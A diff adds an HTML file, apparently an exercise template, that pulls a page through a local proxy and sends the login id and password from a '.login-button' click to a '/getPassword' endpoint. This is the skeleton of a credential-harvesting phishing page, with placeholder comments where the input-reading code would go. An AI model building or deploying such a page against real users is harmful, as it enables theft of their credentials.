@@ -1,0 +1,39 @@
+<html>
+
+<head>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.4.1/jquery.min.js"></script>
+    <script>
+        let newHtml;
+        
+        $(document).ready(function () {
+            $.ajax({
+                url: 'http://127.0.0.1:5000/proxy',
+                success: function (data) {
+                    newHtml = data;
+                    display_html();
+                }
+            });
+        });
+
+        function display_html() {
+            $("body").append(newHtml);
+
+            $(".login-button").click(function(){
+
+                // Get the value from the input fields using $ selector and input field's id's and store their values in userLoginId,  userPassword 
+                
+                
+
+                $.ajax({
+                    url: 'http://127.0.0.1:5000/getPassword',
+                    // Use value of the userLoginId and userPassword variables
+                    data: { id: "userLoginId", password: "userPassword" },
+                });
+            });
+        }
+
+    </script>
+</head>
+<body>
+</body>
+</html>
